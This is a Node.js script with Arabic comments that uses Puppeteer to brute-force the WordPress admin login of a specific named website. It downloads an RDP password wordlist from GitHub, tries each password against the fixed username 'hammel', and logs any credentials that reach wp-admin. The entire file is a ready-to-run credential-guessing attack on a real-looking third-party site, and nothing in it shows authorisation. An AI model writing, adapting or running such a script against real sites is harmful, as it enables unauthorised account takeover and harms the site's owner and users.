const puppeteer = require('puppeteer');
const axios = require('axios');

// الرابط الجديد لملف الباسوردات
const passwordsUrl = 'https://raw.githubusercontent.com/jeanphorn/wordlist/master/rdp_passlist.txt';

// دالة لتحميل البيانات من GitHub باستخدام axios
async function loadFile(url) {
  try {
    const response = await axios.get(url);
    // تقسيم المحتوى إلى أسطر، إزالة الفراغات، وتصفية الأسطر الفارغة
    return response.data.split('\n').map(line => line.trim()).filter(line => line !== '');
  } catch (error) {
    console.error('خطأ في تحميل الملف:', error.message);
    throw error; // إعادة رمي الخطأ ليتم التعامل معه
  }
}

// دالة لاختبار الدخول
async function loginTest() {
  const passwords = await loadFile(passwordsUrl); // تحميل كلمات المرور من GitHub

  // فتح المتصفح باستخدام puppeteer
  const browser = await puppeteer.launch({ headless: false }); // تشغيل المتصفح بشكل مرئي
  const page = await browser.newPage();

  // الانتقال إلى صفحة تسجيل الدخول
  await page.goto('https://www.hammel.in/wp-login.php?redirect_to=https%3A%2F%2Fwww.hammel.in%2Fwp-admin%2F&reauth=1');

  // الانتظار حتى تحميل الصفحة بالكامل
  await page.waitForSelector('#user_login');
  await page.waitForSelector('#user_pass');

  // استخدام اسم المستخدم الثابت (hammel) وتجربة كلمات المرور المختلفة
  const username = 'hammel';

  for (const password of passwords) {
    // إدخال اسم المستخدم وكلمة المرور
    await page.type('#user_login', username); // إدخال اسم المستخدم
    await page.type('#user_pass', password); // إدخال كلمة المرور

    // الضغط على زر "تسجيل الدخول"
    await page.click('#wp-submit');

    // الانتظار لبضع ثوانٍ لتحميل الصفحة بعد محاولة الدخول
    await page.waitForTimeout(2000);

    // التحقق مما إذا كانت الصفحة قد تغيرت إلى صفحة الإدارة
    const url = page.url();
    if (url.includes('wp-admin')) {
      console.log(`تم تسجيل الدخول بنجاح باستخدام ${username} / ${password}`);
      await browser.close();
      return;
    } else {
      console.log(`فشل تسجيل الدخول باستخدام ${username} / ${password}`);

      // إعادة تحميل الصفحة لتجربة كلمة المرور التالية
      await page.goto('https://www.hammel.in/wp-login.php?redirect_to=https%3A%2F%2Fwww.hammel.in%2Fwp-admin%2F&reauth=1');
      await page.waitForSelector('#user_login');
      await page.waitForSelector('#user_pass');
    }
  }

  console.log("تم اختبار جميع الخيارات ولم يتم العثور على تسجيل دخول ناجح.");
  await browser.close();
}

// استدعاء دالة اختبار الدخول
loginTest();
